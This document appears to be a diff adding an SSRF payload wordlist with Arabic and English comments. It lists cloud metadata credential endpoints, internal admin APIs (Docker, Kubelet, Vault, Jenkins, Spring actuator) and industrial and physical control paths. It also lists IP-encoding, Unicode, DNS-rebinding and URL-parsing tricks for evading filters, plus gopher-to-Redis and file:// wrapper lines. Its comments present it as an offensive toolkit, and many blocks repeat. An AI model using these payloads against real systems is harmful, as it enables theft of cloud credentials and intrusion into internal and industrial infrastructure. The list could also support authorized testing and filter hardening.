@@ -1,0 +1,1019 @@
+http://169.254.169.254/latest/meta-data/  # خاص بـ AWS/EC2
+http://metadata.google.internal/computeMetadata/v1/ # خاص بـ Google Cloud
+http://127.0.0.1:80 # محاولة فحص بورتات داخلية
+http://localhost:3306 # فحص وجود قاعدة بيانات MySQL
+# AWS / EC2
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# Google Cloud (GCP)
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2017-08-01
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1.json
+
+# Oracle Cloud
+http://192.0.0.192/1.0/meta-data/
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
+# Localhost & Loopback
+http://127.0.0.1:80
+http://localhost:80
+http://[::1]:80
+
+# Common Internal Ports
+http://127.0.0.1:22          # SSH
+http://127.0.0.1:443         # HTTPS
+http://127.0.0.1:3306        # MySQL
+http://127.0.0.1:5432        # PostgreSQL
+http://127.0.0.1:6379        # Redis (Very Dangerous)
+http://127.0.0.1:27017       # MongoDB
+http://127.0.0.1:8080        # Tomcat/Alternative HTTP
+http://127.0.0.1:9000        # PHP-FPM
+http://127.0.0.1:9200        # Elasticsearch
+# Docker / Unix Socket (Requires Specific Encodings)
+http://localhost:2375        # Docker Remote API
+
+# Kubernetes API
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+
+# Jenkins
+http://localhost:8080/manage
+http://localhost:8080/script # (RCE Potential)
+
+# Kubernetes Kubelet API
+http://localhost:10255/pods
+http://192.168.0.1
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+http://localhost:8081/auth/realms/master/.well-known/openid-configuration # Keycloak
+http://localhost:9000/oauth2/token
+http://localhost:3000/api/v1/users # Grafana/Dashboards
+http://localhost:15672/api/queues # RabbitMQ Management
+http://localhost:5601/status # Kibana
+http://localhost:9092 # Kafka Broker (Check if open)
+http://localhost:9090/api/v1/query # Prometheus Metrics
+# العناوين الرقمية (Decimal/Hex)
+http://2130706433/                # 127.0.0.1 بالصيغة العشرية
+http://0x7f000001/                # 127.0.0.1 بالصيغة الستة عشرية
+http://0/                         # تشير غالباً لـ localhost في Linux
+http://0.0.0.0:80/
+
+# التلاعب بـ DNS (نظام المراوغة)
+http://localtest.me               # يشير دائماً لـ 127.0.0.1
+http://customer1.localhost.me
+http://127.0.0.1.nip.io
+
+# استخدام بورتات "إدارية" نادرة
+http://localhost:28017            # MongoDB Web Interface
+http://localhost:11211            # Memcached
+http://localhost:5984             # CouchDB
+http://localhost:8080/job/build    # Jenkins Build
+http://localhost:8111/guestAuth/app/rest/projects # TeamCity
+http://localhost:9000/api/system/status # SonarQube
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/metadata/instance?api-version=2017-08-01
+http://10.0.0.1/admin
+http://192.168.1.1/setup.cgi
+http://localhost:6379/             # Redis
+http://localhost:2375/             # Docker API
+http://localhost:10250/pods        # Kubelet API
+http://localhost:10255/pods        # Kubelet Read-only
+http://localhost:9090/metrics      # Prometheus
+http://localhost:8000/config.json
+http://localhost:8888/             # Jupyter Notebook
+http://127.0.0.1.xip.io/
+http://[::1]/                      # IPv6 Loopback
+# OpenStack (الخدمات السحابية الخاصة)
+http://169.254.169.254/openstack/latest/meta_data.json
+
+# Kubernetes Secrets (الحصول على مفاتيح التشفير)
+http://localhost:10250/runningpods/
+http://localhost:10255/specs/
+
+# Amazon ECS (الحاويات المرنة)
+http://169.254.170.2/v2/metadata
+http://169.254.170.2/v2/credentials/
+
+# HashiCorp Vault (إدارة الأسرار والكلمات السرية)
+http://localhost:8200/v1/sys/health
+# VMware vCenter / ESXi
+https://localhost/mob/?moid=ServiceInstance&doPath=content.about
+
+# SAP Management Console
+http://localhost:50013/google.com
+http://localhost:50013/sapmc/config.xml
+
+# Cisco Webex / Devices
+http://192.168.1.1/W_V_Settings.xml
+http://192.168.1.1/admin/config.xml
+# العناوين بترميز ثماني (Octal)
+http://0177.0.0.1/               # تشير لـ 127.0.0.1
+
+# العناوين بترميز مختلط (Mixed Encoding)
+http://0x7f.1/                   # تشير لـ 127.0.0.1
+
+# العناوين بترميز CIDR (المجالات)
+http://127.127.127.127/
+
+# استخدام خدمات DNS Rebinding (خطير جداً)
+http://A.B.C.D.rbndr.us          # خدمة لتحويل عنوان لآخر لحظياً
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2017-08-01
+http://127.0.0.1:2375            # Docker
+http://localhost:6379           # Redis
+http://localhost:9200           # Elasticsearch
+http://localhost:11211          # Memcached
+http://localhost:8200/v1/sys/   # Vault
+http://169.254.170.2/v2/        # ECS
+http://[::ffff:7f00:1]          # IPv6 mapped IPv4 localhost
+http://0/                       # Shortcut for localhost in some OS
+http://localtest.me
+http://spoofed.burpcollaborator.net
+# VMware vSphere (إدارة السيرفرات الوهمية)
+http://localhost:443/sdk
+http://localhost:80/ui/login
+
+# Cisco Prime Infrastructure
+http://localhost:8080/webacs/login.do
+
+# SolarWinds (نظام مراقبة الشبكات الشهير)
+http://localhost:8989/
+http://localhost:8787/Orion/Login.aspx
+
+# F5 BIG-IP (إدارة أحمال الشبكة)
+https://localhost/mgmt/tm/util/bash
+# IPMI / BMC (إدارة السيرفر على مستوى الهاردوير)
+http://localhost:623/
+http://localhost:80/cgi/login.cgi
+
+# Schneider Electric / PLC
+http://192.168.0.1/index.htm
+http://192.168.1.1/images/logon.gif
+# بروتوكول Gopher (لإرسال طلبات خام لـ Redis أو MySQL)
+gopher://127.0.0.1:6379/_SET%20test%201
+
+# بروتوكول PHP Wrappers (للوصول للملفات أو الشبكة)
+php://filter/convert.base64-encode/resource=http://169.254.169.254/
+
+# بروتوكول Netbios (لأنظمة ويندوز)
+\\127.0.0.1\c$\windows\win.ini
+
+# بروتوكول LDAP (للوصول لدليل المستخدمين)
+ldap://localhost:389/dc=example,dc=com
+# Cloud Metadata (All-in-One)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/metadata/instance?api-version=2017-08-01
+http://100.100.100.200/latest/meta-data/  # Alibaba
+http://192.0.0.192/1.0/meta-data/          # Oracle
+
+# Bypasses
+http://017700000001/                       # Octal 127.0.0.1
+http://2130706433/                         # Decimal 127.0.0.1
+http://0x7f000001/                         # Hex 127.0.0.1
+http://127.0.0.1.nip.io/                   # DNS wildcard
+http://[::1]/                              # IPv6 localhost
+
+# Internal Ops
+http://localhost:2375/version              # Docker
+http://localhost:10250/pods                # Kubelet
+http://localhost:8200/v1/sys/health        # Vault
+http://localhost:9090/api/v1/targets       # Prometheus
+http://localhost:15672/api/overview        # RabbitMQ
+http://localhost:5601/status               # Kibana
+# TR-069 (إدارة الراوترات عن بعد)
+http://192.168.1.1:7547/
+http://localhost:7547/
+
+# Asterisk (أنظمة الـ VoIP)
+http://localhost:8088/static/config.html
+http://localhost:8088/ari/details
+
+# Squid Proxy (إذا كان السيرفر يعمل كوكيل)
+http://localhost:3128/squid-internal-mgr/info
+# PACS (أنظمة أرشفة الصور الطبية)
+http://localhost:8042/instances
+http://localhost:8042/patients
+
+# FHIR Server
+http://localhost:8080/fhir/metadata
+# استخدام الـ Redirection (إذا كنت تملك سيرفر خارجي)
+# اجعل السيرفر الخاص بك يوجه الطلب داخلياً
+http://your-server.com/redirect?url=http://127.0.0.1:80
+
+# استخدام الفراغات أو الحروف الغريبة (تعتمد على ثغرات الـ URL Parsing)
+http://127.0.0.1%20/
+http://127.0.0.1%00/
+http://127.0.0.1%0d%0a/
+
+# استخدام IPv6 المطور
+http://[0:0:0:0:0:ffff:7f00:1]
+http://[0000:0000:0000:0000:0000:ffff:7f00:0001]
+# Metadata & Cloud
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env
+http://metadata.google.internal/computeMetadata/v1/beta/
+http://100.100.100.200/latest/user-data/
+
+# Internal Management
+http://localhost:10000/             # Webmin
+http://localhost:9000/              # Portainer / PHP-FPM
+http://localhost:8000/              # Python SimpleHTTPServer
+http://localhost:4444/              # Selenium Grid
+http://localhost:5900/              # VNC (Check if HTTP wrapped)
+
+# Rare Bypasses
+http://localhost.lan/
+http://127.1/
+http://0177.1/
+http://0x7f.0x0.0x0.0x1/
+http://2130706433/
+http://[::]/
+http://localhost:8080/adapter/swift/status
+http://localhost:9000/iso20022/validator
+http://localhost:8081/pki/internal/ca.crt
+http://localhost:8443/gateway/admin/config
+http://localhost:5985/wsman           # WinRM (إدارة ويندوز عن بعد)
+http://localhost:80/ADfs/ls/          # Active Directory Federation Services
+http://localhost:389/                 # LDAP (كشف هيكلية المستخدمين)
+# استخدام الـ Port الصفر (في بعض الأنظمة يشير لـ Localhost)
+http://127.0.0.1:0/
+
+# استخدام عناوين الـ IPv6 المختصرة جداً
+http://[::]/
+http://[0000::1]/
+
+# استخدام الـ "Broken URL" (تجاوز الفلاتر التي تبحث عن النقطة)
+http://localhost./
+http://127.0.0.1./
+
+# استخدام خدمات تحويل الـ IP لأسماء نطاقات عشوائية
+http://bit.ly/3XXXXX (رابط مختصر يوجه لـ 169.254.169.254)
+# Cloud & Advanced Metadata
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://169.254.169.254/metadata/v1/
+
+# Dev & Ops Internal
+http://localhost:2376                # Docker (TLS)
+http://localhost:10248/healthz       # Kubelet Health
+http://localhost:8001/api/v1/        # K8s Proxy
+http://localhost:9000/api/qualitygates/project_status # SonarQube
+
+# Bypasses & Weird IPs
+http://127.0.0.1.nip.io
+http://[::ffff:127.0.0.1]
+http://0177.00.00.01
+http://2130706433
+http://0x7f000001
+http://0/
+http://[::1]
+
+# Storage & Databases
+http://localhost:50070/              # HDFS (Hadoop)
+http://localhost:8081/               # Schema Registry (Kafka)
+http://localhost:2181/               # Zookeeper
+http://localhost:8002/ussd/handler
+http://localhost:8080/sms/gateway/send
+http://localhost:9001/mms/relay
+http://localhost:8888/charging/v1/request
+http://localhost:3270/             # IBM Terminal Emulator Web
+http://localhost:10443/zosmf/      # z/OS Management Facility
+http://localhost:20443/cas/        # Customer Information Control System (CICS)
+http://localhost.                  # النقطة في النهاية قد تتجاوز بعض الفلاتر
+http://localhost:080/              # استخدام الصفر الزائد لتجاوز فحص البورت
+http://[0000::1]:80/               # IPv6 بصيغة مطولة جداً
+http://127.0.0.1.                  # IP ينتهي بنقطة (يعمل في بعض أنظمة DNS)
+# Telecom & Specialized
+http://localhost:7547/             # TR-069
+http://localhost:8088/ari/         # Asterisk
+http://localhost:5060/             # SIP (if HTTP wrapped)
+http://localhost:8000/api/v1/proxy
+
+# Cloud Meta-Data (The Rare Ones)
+http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# Obscure Bypasses
+http://0x7f.1                      # Minimal Hex
+http://2130706433                  # Decimal Only
+http://017700000001                # Octal Only
+http://[::1]                       # IPv6 Short
+http://[0:0:0:0:0:0:0:1]           # IPv6 Long
+http://127.8.8.8                   # Any 127.x.x.x works as localhost
+
+# Database & Cache (The Deep End)
+http://localhost:11211/            # Memcached
+http://localhost:5984/_all_dbs     # CouchDB
+http://localhost:8983/solr/        # Apache Solr
+http://localhost:5432/             # PostgreSQL (Check for HTTP response)
+http://localhost:8080/scada/api/v1/config
+http://localhost:502/status             # Modbus over HTTP
+http://192.168.100.1/admin/network.xml   # محطات تحويل الطاقة
+http://localhost:8081/iec61850/control
+http://localhost:8000/telemetry/metadata
+http://169.254.169.254/latest/meta-data/placement/availability-zone  # موقع السيرفر الجغرافي في السحابة
+http://localhost:9000/gnss/receiver/status
+# استخدام الرموز التي تُفسر بشكل مختلف بين السيرفر والـ WAF
+http://127.0.0.1#@google.com:80/      # قد يظن الـ WAF أنك تطلب google.com
+http://127.0.0.1:80?@google.com/
+http://google.com:80@127.0.0.1/        # استخدام الـ Userinfo للتمويه
+
+# استخدام الـ "Slash" المكرر أو المائل للخلف
+http://127.0.0.1:80//
+http://127.0.0.1:80\/
+
+# استخدام ترميز الـ Unicode للحروف التي تشبه النقطة
+http://127.0.0.1。                   # استخدام الحرف U+3002 (Ideographic Full Stop)
+http://127．0．0．1                   # استخدام Fullwidth characters
+# Specialized Systems
+http://localhost:4840/               # OPC UA (Industrial)
+http://localhost:5985/wsman           # Windows Remote Management
+http://localhost:161/                # SNMP (if translated via Gateway)
+http://localhost:8161/admin/         # ActiveMQ
+
+# Advanced Cloud & K8s
+http://169.254.169.254/latest/meta-data/iam/info
+http://169.254.169.254/latest/meta-data/events/maintenance/scheduled
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://localhost:10248/healthz
+
+# The "Forbidden" Bypasses
+http://0/
+http://127.1/
+http://127.0.0.1./
+http://[0000:0000:0000:0000:0000:ffff:7f00:0001]/
+http://127.0.0.1%23.google.com
+http://127.0.0.1.nip.io
+http://localhost:8080/auth/admin/master/console/ # Keycloak Admin
+http://localhost:3000/admin/users                # Grafana Admin
+http://localhost:8181/v1/data                    # OPA (Open Policy Agent)
+http://localhost:9011/admin                      # FusionAuth
+http://localhost:8080/actuator                   # Spring Boot Actuator (أخطر هدف)
+http://localhost:8080/actuator/env               # تسريب بيئة النظام
+http://localhost:8080/actuator/heapdump          # سحب ذاكرة النظام كاملة
+http://localhost:8761/eureka/apps                # Netflix Eureka Discovery
+# استخدام الـ URL الفائض (URL Overloading)
+http://127.0.0.1:80/https://google.com/
+http://127.0.0.1:80/..;/..;/
+
+# استخدام الـ IPv6 بصيغة الـ URI (التي يتجاهلها الـ WAF أحياناً)
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+
+# استخدام الـ IDN (نطاقات الحروف الدولية) للتمويه
+http://xn--lh-mva.com/ 
+# Actuators & Metrics
+http://localhost:8080/actuator/health
+http://localhost:8080/actuator/configprops
+http://localhost:8081/actuator/prometheus
+http://localhost:9091/metrics
+
+# Enterprise Middleware
+http://localhost:4848/                           # GlassFish Admin
+http://localhost:9990/                           # WildFly / JBoss Management
+http://localhost:7001/console/                   # WebLogic Console
+
+# Advanced Bypasses
+http://127.127.127.127
+http://127.0.1.1
+http://0177.0.0.1
+http://0x7f.1
+http://[::ffff:7f00:1]
+http://①②⑦.⓪.⓪.① 
+http://localhost:8200/v1/auth/token/lookup-self # HashiCorp Vault Token
+http://localhost:8080/kms/api/v1/keys
+http://localhost:9000/api/pki/sign
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/
+http://localhost:8091/pools/default             # Couchbase
+http://localhost:8086/query?q=SHOW+DATABASES    # InfluxDB
+http://localhost:8500/v1/agent/self             # Consul (Service Mesh)
+http://localhost:2381/metrics                   # etcd (القلب النابض لـ Kubernetes)
+# استخدام "العنوان الفارغ" (قد يُفسر كـ Localhost في بعض المكتبات)
+http://.
+http://..
+
+# استخدام الـ Encoding المزدوج (Double Encoding)
+http://127%252e0%252e0%252e1/
+
+# استخدام الـ Overlong UTF-8 (تجاوز الفلاتر التي تبحث عن أرقام محددة)
+http://127.0.0.1%c0%ae/ (بديل للنقطة)
+
+# استخدام الـ Short-Form لـ IPv6 (تجاوز فلاتر الطول)
+http://[::]
+http://[::1]
+# Container & Service Mesh
+http://localhost:15000/stats                 # Istio Proxy
+http://localhost:15021/healthz/ready         # Istio Ingress
+http://localhost:10256/healthz               # Kube-proxy
+
+# Cloud Provider (Metadata Extra)
+http://169.254.169.254/latest/meta-data/block-device-mapping/
+http://metadata.google.internal/computeMetadata/v1/instance/disks/
+http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01
+
+# Advanced Internal Paths
+http://localhost:8080/jolokia/list           # JMX via HTTP (أخطر هدف في Java)
+http://localhost:8080/actuator/mappings      # كشف جميع الروابط في Spring
+http://localhost:8080/debug/pprof/           # Go Debugging
+http://localhost:81/nginx_status             # Nginx Stub Status
+http://localhost:80/server-status            # Apache Status (يكشف مسارات المستخدمين)
+http://localhost:1936/haproxy?stats          # HAProxy Stats
+http://localhost:1080/                       # MailHog (لرؤية رسائل البريد الداخلي)
+http://localhost:4566/                       # LocalStack (AWS Emulator)
+http://localhost:10001/                      # Azure Storage Emulator
+http://localhost:8085/                       # Google Pub/Sub Emulator
+# استخدام الـ URI مع الحروف المائلة العكسية (Backslashes)
+http://127.0.0.1:80/..\/..\/
+http://127.0.0.1:80/..%5c..%5c
+
+# استخدام الـ Unicode للتلاعب بالنطاق (Domain Fuzzing)
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ                     # محاكاة كلمة localhost
+http://localhost。google.com               # استخدام النقطة الصينية للتلاعب
+
+# استخدام بورتات "تجاوز الفحص" (Reserved Ports)
+http://127.0.0.1:000080/                  # إضافة أصفار للبورت
+http://127.0.0.1:65536/                   # الالتفاف الرقمي (Overflow)
+# Monitoring & Logs
+http://localhost:3000/metrics                # Grafana
+http://localhost:9100/metrics                # Node Exporter
+http://localhost:1248/                       # InfluxDB (Old)
+
+# Specialized Bypasses
+http://[::1]                                 # IPv6 Shortest
+http://[0:0:0:0:0:ffff:127.0.0.1]            # IPv4-Mapped IPv6
+http://127.1                                 # Minimal IPv4
+http://0                                     # Shortcut for 0.0.0.0 (Linux)
+http://2130706433                            # Integer Form
+http://0x7f.0x0.0x0.0x1                      # Full Hex Form
+
+# Internal APIs
+http://localhost:8888/api/v1/                # Jupyter / Docker
+http://localhost:5000/v2/_catalog            # Docker Private Registry
+http://localhost:8080/v1/api/
+http://localhost:8000/cgi-bin/vpn_status
+http://localhost:8443/remote/login           # Fortigate/SSL-VPN
+http://localhost:8080/manage/site/default    # UniFi Controller
+http://localhost:9443/api/v1/status          # Portainer
+http://10.0.2.2:15393/                       # Vagrant (Default Gateway)
+http://192.168.122.1/                        # Libvirt/KVM Default Gateway
+http://192.168.99.100/                       # Docker Toolbox (Old)
+# استخدام الـ (At symbol) بشكل مزدوج
+http://user:pass@127.0.0.1:80@google.com/
+
+# استخدام الـ (Percent Encoding) للتحايل على فحص الـ "127"
+http://%31%32%37%2e%30%2e%30%2e%31/
+
+# استخدام الـ (Double Dots) في الـ IPv4
+http://127.1/ (تعادل 127.0.0.1)
+http://127..1/ (تعادل 127.0.0.1 في بعض الأنظمة)
+
+# استخدام الـ (Square Brackets) لغير IPv6
+http://[127.0.0.1]/
+# Monitoring & Metrics
+http://localhost:9093/                       # Alertmanager
+http://localhost:9115/probe                  # Blackbox Exporter
+http://localhost:9042/                       # Cassandra (CQL)
+
+# Bypasses & Variations
+http://0.0.0.0/                              # Shortcut for all interfaces
+http://[::ffff:7f00:0001]/                   # IPv4-in-IPv6
+http://127.0.0.1.nip.io/
+http://2130706433/                           # Decimal
+http://0177.0.0.1/                           # Octal
+http://0x7f000001/                           # Hex
+
+# Internal Tools
+http://localhost:11434/api/generate          # Ollama (AI local API)
+http://localhost:8983/solr/admin/info/system # Apache Solr
+http://localhost:8080/manager/html           # Tomcat Manager
+http://localhost:1111/                # Sun RPC
+http://localhost:3270/                # IBM Mainframe Terminal Web
+http://localhost:9080/                # IBM WebSphere Default Port
+http://localhost:9443/ibm/console     # WebSphere Admin Console
+http://192.168.100.1/config.xml       # Huawei/GPON Routers
+http://localhost:8008/                # Chromecast/Google Home Local API
+http://localhost:1900/                # UPnP/SSDP Discovery
+http://localhost:5555/                # Android Debug Bridge (ADB) over WiFi
+# استخدام الـ (Triple Slash) لتجاوز فلاتر البداية
+///127.0.0.1:80/
+# استخدام الـ (Backslash) المزدوج (خاص بأنظمة Windows)
+\\127.0.0.1\c$\
+# استخدام الـ (Null Byte) لإنهاء الرابط بشكل مفاجئ
+http://127.0.0.1%00.google.com/
+# استخدام الـ (Mixed IP Formats)
+http://0x7f.0.0.1/                    # خليط بين الستة عشري والعشري
+# Development & Debugging
+http://localhost:2000/                # Cisco Config Copy
+http://localhost:4242/                # Quasar RAT / C2 (Rare)
+http://localhost:5984/_utils/         # CouchDB Fauxton
+http://localhost:8080/phpmyadmin/     # Classic Entry
+
+# Unique Bypasses
+http://0.0.0.0:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://127.0.0.1.nip.io
+http://local.gd/                      # Another localhost wildcard
+http://vcap.me/                       # Standard local dev domain
+
+# Storage & Infrastructure
+http://localhost:50070/               # HDFS NameNode
+http://localhost:50075/               # HDFS DataNode
+http://localhost:8042/node            # Hadoop YARN
+http://localhost:19888/jobhistory     # MapReduce History
+http://localhost:80/status.xml        # Meinberg Radio Clocks
+http://127.0.0.1/pps/stats            # Precision Time Protocol
+http://localhost:4000/ntp             # NTP Management Interface
+http://localhost/forms/main.html      # APC UPS Web Interface
+http://192.168.0.254/status.xml       # CyberPower Management
+http://localhost/pdu/outlet_control   # Smart PDU
+# استخدام الـ (Unicode) المزدوج للحروف التي تشبه "localhost"
+http://Ⓛⓞⓒⓐⓛⓗⓞⓢⓣ:80/
+
+# استخدام عناوين IPv4 غير مكتملة (تكملها أنظمة التشغيل تلقائياً)
+http://127.1/
+http://127.0.1/
+
+# استخدام الـ (Overflow) في العناوين العشرية
+http://4294967300/                    # قد يترجمه النظام لـ 127.0.0.1 (بسبب الالتفاف الرقمي)
+
+# استخدام عناوين IPv6 "الصفرية" بصيغ مختلفة
+http://[::ffff:127.1]/
+http://[0000::1]/
+# Industrial & Specialized
+http://localhost:502/                 # Modbus TCP (Industrial)
+http://localhost:4840/                # OPC UA (Automation)
+http://localhost:8000/api/v1/         # Generic Internal API
+http://localhost:9000/api/system/     # SonarQube / MinIO
+
+# Rare Bypasses
+http://0/                             # Shortcut for 0.0.0.0
+http://127.1
+http://2130706433
+http://017700000001
+http://[::1]
+http://127.0.0.1.                     # IP with trailing dot
+
+# Virtualization & SDN
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://100.100.100.200/latest/meta-data/  # Alibaba Cloud
+http://localhost:11000/api/v1/transfer/status
+http://localhost:8080/pki/internal/revoke
+http://localhost:9999/hsm/status             # مفاتيح تشفير الفيزا
+http://localhost:8001/gateway/audit          # سجل العمليات البنكية
+http://localhost:8080/solr/admin/cores       # Apache Solr (تسريب البيانات)
+http://localhost:9200/_cat/indices?v         # Elasticsearch (فهرس البيانات)
+http://localhost:5601/api/status             # Kibana (الحالة الأمنية)
+http://localhost:9000/system/metrics         # Graylog (سجلات الدخول)
+# استخدام الـ URI مع إضافة مسافات (إذا كان الـ Parser يتجاهلها)
+http:// 127.0.0.1 : 80 /
+# استخدام الـ IPv4 المختصر جداً (تفسره لغة C بشكل مختلف)
+http://127.1
+# استخدام الـ IPv4 بصيغة Octal مع أصفار زائدة
+http://0000000000177.0.0.1
+# استخدام ترميز الـ Unicode للحروف التي تشبه "N" أو "A" في النطاقات المحلية
+http://localhosｔ/ (باستخدام U+FF54)
+# Rare Infrastructure
+http://localhost:10250/pods                  # Kubelet API (Secrets)
+http://localhost:2379/v2/keys                # etcd (K8s Key-Value)
+http://localhost:8200/v1/sys/seal-status     # Vault (Encryption)
+http://localhost:8500/v1/catalog/services    # Consul
+
+# Advanced Bypasses
+http://0/                                    # Linux Shortcut for localhost
+http://127.1
+http://2130706433                            # Decimal
+http://0177.0.0.1                            # Octal
+http://[::1]                                 # IPv6
+http://[::ffff:7f00:1]                       # IPv4-mapped IPv6
+
+# Cloud Internal Extra
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+http://100.100.100.200/latest/meta-data/     # Alibaba Cloud
+http://localhost:8088/services/ConfigService # TR-064 management
+http://localhost:49152/wps_device.xml        # UPnP Configuration
+http://localhost:5431/dyndev/uuid            # Intel SDK for UPnP
+http://localhost:2869/                       # SSDP/UPnP on Windows
+http://localhost:11434/api/tags             # Ollama (AI API)
+http://localhost:7860/                      # Stable Diffusion WebUI
+http://localhost:5000/v1/models             # Local LLM Serving
+http://localhost:8000/v1/completions        # OpenAI-compatible local servers
+# استخدام الأرقام "السالبة" (تؤدي للالتفاف الرقمي في بعض الأنظمة)
+http://-255.255.255.255/ 
+
+# استخدام العناوين "المنقوصة" (Omitted segments)
+http://127.1/               # تعني 127.0.0.1
+http://0177.1/               # ثماني (Octal) مختصر
+
+# استخدام الـ Unicode (حروف تشبه النقاط)
+http://127。0。0。1           # استخدام حرف U+3002
+http://127｡0｡0｡1           # استخدام حرف U+FF61
+# Rare & Orphaned
+http://localhost:111/                # RPCbind
+http://localhost:2049/               # NFS (Network File System)
+http://localhost:6000/               # X11 Window System
+http://localhost:8000/api/v2/        # Common internal dev path
+
+# Bypasses (Advanced)
+http://0/
+http://127.1
+http://2130706433
+http://0177.0.0.1
+http://[::ffff:7f00:1]
+http://127.0.0.1.nip.io
+http://localtest.me
+
+# Specialized Middleware
+http://localhost:8081/               # McAfee ePO
+http://localhost:9090/status         # Cockpit (Linux Management)
+http://localhost:10000/              # Webmin / Virtualmin
+http://localhost:8000/telemetry/v1/position
+http://localhost:9000/sat/link/status
+http://localhost:8081/gnss/monitoring
+http://169.254.169.254/latest/meta-data/placement/region # الموقع الفيزيائي للسيرفر
+http://localhost:8888/lab/api/settings       # JupyterLab Internal
+http://localhost:8080/scada/plc/status       # التحكم في وحدات الـ PLC
+http://localhost:502/                        # Modbus/TCP Gateway
+# استخدام عناوين الـ IPv4 "الممطوطة" (تتجاوز الفلاتر الطولية)
+http://000177.000000.000000.000001/
+
+# استخدام الـ (Non-Zero Padding) في البورتات
+http://127.0.0.1:000000000000080/
+
+# استخدام "عناوين النطاق العريض" الخاصة بالشبكات المحلية (Link-Local)
+http://[fe80::1%eth0]:80/                   # IPv6 Link-Local
+http://169.254.1.1/                         # APIPA address
+# Infrastructure & Storage
+http://localhost:50070/                     # HDFS WebUI
+http://localhost:16010/                     # HBase Master
+http://localhost:8888/api/v1/sessions       # Spark History Server
+http://localhost:9083/                      # Hive Metastore
+
+# Evasion Masterclass
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+http://local.gd
+http://spoofed.burpcollaborator.net
+http://0x7f000001
+http://2130706433
+http://0177.0.0.1
+http://[::1]
+
+# Secret Cloud Paths
+http://169.254.169.254/metadata/v1/maintenance
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/keep-alive
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://localhost:8080/traffic/lights/status
+http://localhost:9000/scada/power/grid
+http://localhost:8081/water/pressure/control
+http://192.168.1.100/admin/camera/config.xml
+http://100.100.100.200/latest/meta-data/      # Alibaba Cloud (خاص)
+http://169.254.169.254/metadata/v1.json        # DigitalOcean
+http://192.0.0.192/1.0/meta-data/              # Oracle Cloud (Legacy)
+http://metadata.tarserv.com/                   # أنظمة سحابية خاصة
+# استخدام الـ (Half-Width) والـ (Full-Width) Unicode
+http://１２７.０.０.１/
+# استخدام الـ (Internal Scheme) لتجاوز فحص HTTP
+file:///proc/net/tcp                           # لقراءة البورتات المفتوحة مباشرة
+# استخدام الـ (Overflow) في العناوين العشرية (بصيغة أكبر من 32-bit)
+http://4294967300/                             # قد يترجم لـ 127.0.0.4
+# استخدام الـ (Trailing Dots) المتعددة
+http://localhost..../
+# Deep Infrastructure
+http://localhost:2181/                         # Zookeeper
+http://localhost:5672/                         # AMQP (RabbitMQ)
+http://localhost:11211/                        # Memcached
+http://localhost:9042/                         # Cassandra
+
+# The "Forbidden" Bypasses
+http://0/
+http://127.1
+http://2130706433
+http://0x7f000001
+http://017700000001
+http://[::1]
+http://[::ffff:7f00:1]
+http://127.0.0.1.nip.io
+
+# System Control
+http://localhost:623/                          # IPMI (Hardware management)
+http://localhost:8080/jmx-console/             # JBoss JMX
+http://localhost:8000/api/v1/config            # Generic Config Endpoint
+http://localhost:8080/sat/telemetry/config
+http://localhost:9000/ground-station/uplink
+http://localhost:8081/satellite/identity/v2
+http://127.0.0.1:5000/gnss/position/log
+http://localhost:8080/plc/monitoring/v1
+http://localhost:80/epics/gateway/status      # بروتوكول EPICS للمسرعات النووية
+http://127.0.0.1:4840/server/diagnostics     # OPC UA Diagnostics
+# High-Value Targets
+http://localhost:8200/v1/sys/init             # HashiCorp Vault Init
+http://localhost:2375/containers/json?all=1   # Docker Remote API
+http://localhost:10255/pods/                  # Kubelet Read-only
+http://localhost:15672/api/whoami             # RabbitMQ Auth
+
+# Master Bypasses
+http://0/
+http://127.1
+http://2130706433
+http://0x7f.1
+http://0177.0.0.1
+http://[::]
+http://[::1]
+http://127.0.0.1.nip.io
+
+# Environment & Logic
+http://localhost/.env
+http://localhost/phpinfo.php
+http://localhost/server-status
+http://localhost/config/database.yaml
+http://localhost:8080/api/v1/face/match
+http://localhost:9000/biometrics/fingerprint/status
+http://localhost:8081/access-control/gate/open
+http://127.0.0.1:5000/security/logs/audit
+http://localhost:9445/                 # NVIDIA DCGM Exporter
+http://localhost:9090/query?query=gpu_temp
+http://localhost:8080/v1/models/status # TensorFlow Serving
+http://localhost:11434/api/ps          # Ollama Running Models
+# Rare & Emerging Infrastructure
+http://localhost:2375/v1.24/version      # Docker Remote API
